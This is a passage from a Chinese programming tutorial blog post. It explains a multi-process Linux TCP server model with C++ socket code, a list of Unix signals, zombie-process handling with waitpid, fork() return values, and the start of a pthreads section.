  &lt;li&gt;6、TCP的逻辑通信信道是全双工的可靠信道，UDP则是不可靠信道&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;0x03-服务端模型&quot;&gt;0x03 服务端模型&lt;/h2&gt;

&lt;p&gt;终于等到本文的重点了！&lt;/p&gt;

&lt;p&gt;先来个图：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-3-20/0x04.png&quot; alt=&quot;enter description here&quot; title=&quot;0x04&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;模型解读&quot;&gt;模型解读&lt;/h3&gt;

&lt;p&gt;首先，主进程用于创建套接字，管理僵尸进程，子进程用于服务监听，接收客户端发送来的数据，它主要用于创建孙进程，客户端派发N个任务就创建N个孙进程。&lt;/p&gt;

&lt;p&gt;这个模型很适合UDP协议呀，有木有！&lt;/p&gt;

&lt;h3 id=&quot;模型代码&quot;&gt;模型代码&lt;/h3&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;startServer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SIGCHLD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_signalHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;pid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fork&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 创建子进程
&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;//子进程处理开始
&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// 创建SOCKET描述符
&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;_serverSock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// 设置超时
&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;linger&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeWit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;timeWit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l_onoff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;timeWit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l_linger&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;setsockopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_serverSock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOL_SOCKET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SO_LINGER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;timeWit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;timeWit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// 地址重用
&lt;/span&gt;        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reuse&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;setsockopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_serverSock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOL_SOCKET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SO_REUSEADDR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reuse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reuse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;_serverAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_family&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_serverAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;INADDR_ANY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// 绑定端口
&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;_serverAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;htons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint16_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_listenPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_serverSock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_serverAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_serverAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[*]Server bind Success ...&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[!]Server bind Fail ...&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_clientSize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_clientAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;listen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_serverSock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_clientMaxNum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// 接收客户端请求
&lt;/span&gt;            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_clientSock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_serverSock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_clientAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_clientSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;_clientPID&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fork&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_clientPID&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_serverSock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 关闭服务端Socket
&lt;/span&gt;                    &lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_clientSock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_fromClientBUFF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;500&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 接收数据
&lt;/span&gt;
						&lt;span class=&quot;c1&quot;&gt;// ........
&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;shutdown&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_clientSock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SHUT_RDWR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[*]Server is running ...&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;waitpid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;0x04-信号处理&quot;&gt;0x04 信号处理&lt;/h2&gt;

&lt;p&gt;信号机制是进程之间相互传递消息的一种方法，信号全称为软中断信号，也有人称软中断。从它的命名可以看出，它的实质和使用很像中断，所有，信号可以说是进程控制的一部分&lt;/p&gt;

&lt;p&gt;这段话写的可能有点晦涩难懂，我就写一个程序给你看看：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-3-20/0x05.png&quot; alt=&quot;enter description here&quot; title=&quot;0x05&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这段程序运行以后，我们一直按一次CTRL+C，会输出：“Are you sure quit this program ??”&lt;/p&gt;

&lt;p&gt;然后过10秒后，程序会输出“Exiting…..”，然后会自动退出……&lt;/p&gt;

&lt;h3 id=&quot;信号列表&quot;&gt;信号列表&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;SIGHUP：本信号在用户终端连接（正常或非正常）结束时发出，通常是在终端的控制进程结束的，通知同一session内的各个作用，这是它们与控制终端不再关联&lt;/li&gt;
  &lt;li&gt;SIGINT：程序终止(interrupt)信号, 在用户键入INTR字符(通常是Ctrl-C)时发出，用于通知前台进程组终止进程&lt;/li&gt;
  &lt;li&gt;SIGQUIT：和SIGINT类似, 但由QUIT字符(通常是Ctrl-/)来控制. 进程在因收到SIGQUIT退出时会产生core文件,在这个意义上类似于一个程序错误信号&lt;/li&gt;
  &lt;li&gt;SIGILL：执行了非法指令. 通常是因为可执行文件本身出现错误, 或者试图执行数据段. 堆栈溢出时也有可能产生这个信号&lt;/li&gt;
  &lt;li&gt;SIGTRAP：由断点指令或其它trap指令产生. 由debugger使用&lt;/li&gt;
  &lt;li&gt;SIGABRT：调用abort函数生成的信号&lt;/li&gt;
  &lt;li&gt;SIGBUS：非法地址, 包括内存地址对齐(alignment)出错。比如访问一个四个字长的整数, 但其地址不是4的倍数。它与SIGSEGV的区别在于后者是由于对合法存储地址的非法访问触发的(如访问不属于自己存储空间或只读存储空间)&lt;/li&gt;
  &lt;li&gt;SIGFPE：在发生致命的算术运算错误时发出. 不仅包括浮点运算错误, 还包括溢出及除数为0等其它所有的算术的错误。&lt;/li&gt;
  &lt;li&gt;SIGKILL：用来立即结束程序的运行. 本信号不能被阻塞、处理和忽略。如果管理员发现某个进程终止不了，可尝试发送这个信号。&lt;/li&gt;
  &lt;li&gt;SIGUSR1：留给用户使用&lt;/li&gt;
  &lt;li&gt;SIGSEGV：试图访问未分配给自己的内存, 或试图往没有写权限的内存地址写数据&lt;/li&gt;
  &lt;li&gt;SIGUSR2：留给用户使用&lt;/li&gt;
  &lt;li&gt;SIGPIPE：管道破裂。这个信号通常在进程间通信产生，比如采用FIFO(管道)通信的两个进程，读管道没打开或者意外终止就往管道写，写进程会收到SIGPIPE信号。此外用Socket通信的两个进程，写进程在写Socket的时候，读进程已经终止&lt;/li&gt;
  &lt;li&gt;SIGALRM：时钟定时信号, 计算的是实际的时间或时钟时间. alarm函数使用该信号&lt;/li&gt;
  &lt;li&gt;SIGTERM：程序结束(terminate)信号, 与SIGKILL不同的是该信号可以被阻塞和处理。通常用来要求程序自己正常退出，shell命令kill缺省产生这个信号。如果进程终止不了，我们才会尝试SIGKILL&lt;/li&gt;
  &lt;li&gt;SIGCHLD：子进程结束时, 父进程会收到这个信号&lt;/li&gt;
  &lt;li&gt;SIGCONT：让一个停止(stopped)的进程继续执行. 本信号不能被阻塞. 可以用一个handler来让程序在由stopped状态变为继续执行时完成特定的工作. 例如, 重新显示提示符&lt;/li&gt;
  &lt;li&gt;SIGSTOP：停止(stopped)进程的执行. 注意它和terminate以及interrupt的区别:该进程还未结束,只是暂停执行. 本信号不能被阻塞, 处理或忽略&lt;/li&gt;
  &lt;li&gt;SIGTSTP：停止进程的运行, 但该信号可以被处理和忽略. 用户键入SUSP字符时(通常是Ctrl-Z)发出这个信号&lt;/li&gt;
  &lt;li&gt;SIGTTIN：当后台作业要从用户终端读数据时, 该作业中的所有进程会收到SIGTTIN信号. 缺省时这些进程会停止执行&lt;/li&gt;
  &lt;li&gt;SIGTTOU：类似于SIGTTIN, 但在写终端(或修改终端模式)时收到&lt;/li&gt;
  &lt;li&gt;SIGURG：有”紧急”数据或out-of-band数据到达socket时产生&lt;/li&gt;
  &lt;li&gt;SIGXCPU：超过CPU时间资源限制. 这个限制可以由getrlimit/setrlimit来读取/改变&lt;/li&gt;
  &lt;li&gt;SIGXFSZ：当进程企图扩大文件以至于超过文件大小资源限制&lt;/li&gt;
  &lt;li&gt;SIGVTALRM：虚拟时钟信号. 类似于SIGALRM, 但是计算的是该进程占用的CPU时间&lt;/li&gt;
  &lt;li&gt;SIGPROF：类似于SIGALRM/SIGVTALRM, 但包括该进程用的CPU时间以及系统调用的时间&lt;/li&gt;
  &lt;li&gt;SIGWINCH：窗口大小改变时发出&lt;/li&gt;
  &lt;li&gt;SIGIO：文件描述符准备就绪, 可以开始进行输入/输出操作&lt;/li&gt;
  &lt;li&gt;SIGPWR：Powerfailure&lt;/li&gt;
  &lt;li&gt;SIGSYS：非法的系统调用。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;处理僵尸进程&quot;&gt;处理僵尸进程&lt;/h3&gt;

&lt;p&gt;waitpid()会暂时停止目前进程的执行，直到有信号来到或子进程结束。&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 
&lt;span class=&quot;cp&quot;&gt;#include&amp;lt;sys/types.h&amp;gt;
#include&amp;lt;sys/wait.h&amp;gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;waitpid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;0x05-多进程多线程&quot;&gt;0x05 多进程、多线程&lt;/h2&gt;

&lt;p&gt;由于客户端派发过来的任务需要子进程处理，来创建孙进程。&lt;/p&gt;

&lt;p&gt;孙进程处理任务会创建N个线程&lt;/p&gt;

&lt;h3 id=&quot;进程的创建fork&quot;&gt;进程的创建fork()&lt;/h3&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;unistd.h&amp;gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fork&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;实例代码：&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;childPid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fork&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;childPid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;child ...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// .... 子进程处理
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;/// 父进程处理
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;为什么两个进程的fpid不同呢，这与fork函数的特性有关。fork调用的一个奇妙之处就是它仅仅被调用一次，却能够返回两次，它可能有三种不同的返回值：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;1）在父进程中，fork返回新创建子进程的进程ID；&lt;/li&gt;
  &lt;li&gt;2）在子进程中，fork返回0；&lt;/li&gt;
  &lt;li&gt;3）如果出现错误，fork返回一个负值；&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;多线程&quot;&gt;多线程&lt;/h3&gt;

&lt;p&gt;Linux系统下的多线程遵循POSIX线程接口，称为pthread。编写Linux下的多线程程序，需要使用头文件pthread.h，连接时需要使用库libpthread.a。&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;pthread.h&amp;gt;
